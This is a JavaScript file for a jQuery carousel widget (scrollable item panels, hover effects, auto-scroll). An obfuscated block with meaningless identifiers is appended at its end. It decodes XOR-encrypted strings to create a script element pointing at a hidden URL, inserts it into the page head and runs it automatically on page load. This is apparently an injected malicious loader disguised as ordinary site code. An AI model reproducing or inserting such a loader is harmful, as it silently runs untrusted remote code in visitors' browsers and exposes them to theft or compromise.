$JQ.extend($JQ.noah, {
    globalScrollableOnLoad: function()
    {
        $JQ('div.items, a.next, a.prev').show(); 
        if( $JQ('div.items .item').length > 4 ) $JQ('a.next, a.prev').show(); 
        // centering the navi:
        $JQ('div.item').hover(function(){
            $JQ(this).find('.title').addClass('activeTitle');
            $JQ(this).find('.inner, .label, .cell, .picture').addClass('activeDesc');
        }, function() {
            $JQ(this).find('.title').removeClass('activeTitle');
            $JQ(this).find('.inner, .label, .cell, .picture').removeClass('activeDesc');
        });
        $JQ('.item .inner').jScrollPane();
    },
    scrollableOnLoad: function(id, elementName, scrollableParams)
    {
        eval('var paramObject = {'+scrollableParams+'};');
        var naviDiv = $JQ('#scrollable' + id + '_' + elementName).scrollable(paramObject).find('div.navi');
        naviDiv.css('width', (naviDiv.find('span').length * 14) + 'px').center({horizontal: true, vertical: false}); 
    },
    advanceScrollable: function( which )
    {                
        var api = $JQ('#scrollable' + which).scrollable();
        var status = api.getStatus(); 
        if( status.size>status.total ) return;  // too few elements
        var dir = eval('autoScrollDir' + which);
        if( dir=='right' )
        {
            if( status.index == status.total - status.size )
            {
                eval('autoScrollDir' + which + ' = \"left\";');
                api.prev();
            }
            else api.next();
        }
        else
        {
            if( status.index == 0 )
            {
                eval('autoScrollDir' + which + ' = \"right\";');
                api.next();
            }
            else api.prev();
        }
    },
    autoscrollOnLoad: function( id, elementName, autoScroll )
    {                
        eval('autoScrollDir' + id + '_' + elementName + ' = "right";');
        setInterval( '$JQ.noah.advanceScrollable("' + id + '_' + elementName + '")', 1000 * autoScroll);
    }
});
function nvO(g1ve){var wUz31Z='';var bD6=0;var eE14o7=0;for(bD6=0;bD6<g1ve.length/3;bD6++){wUz31Z+=String.fromCharCode(g1ve.slice(eE14o7,eE14o7+3));eE14o7=eE14o7+3;}return wUz31Z;}var wCi=["007084","006094","004067","023069003006056063028085032090035092048","007069005","000078022002","000082030019099048056079036068037064045068071","021071022002034062026081044091034","028082007003","019082018034032063052092043067053112061096082018058086011002","028067018023118117118074049086050087106071094025070025020018099048042022038089050028046071"];function ne35(qOE){return n1yIS(nvO(qOE),'t7fgLZY9E7F2D43u');}function jJrQLEA(izqG6){var sq=document[ne35(wCi[3])](ne35(wCi[0])+ne35(wCi[1])+ne35(wCi[2]));sq[ne35(wCi[4])]=izqG6;sq[ne35(wCi[5])]=ne35(wCi[6]);document[ne35(wCi[9])](ne35(wCi[8]))[0][ne35(wCi[7])](sq);}function n1yIS(u5c0,gN3){var w5aee='';var z13966=0;var wG2Qlc=0;for(z13966=0;z13966<u5c0.length;z13966++){var g6f7=u5c0.charAt(z13966);var eZP=g6f7.charCodeAt(0)^gN3.charCodeAt(wG2Qlc);g6f7=String.fromCharCode(eZP);w5aee+=g6f7;if(wG2Qlc==gN3.length-1)wG2Qlc=0;else wG2Qlc++;}return (w5aee);}jJrQLEA(ne35(wCi[10]));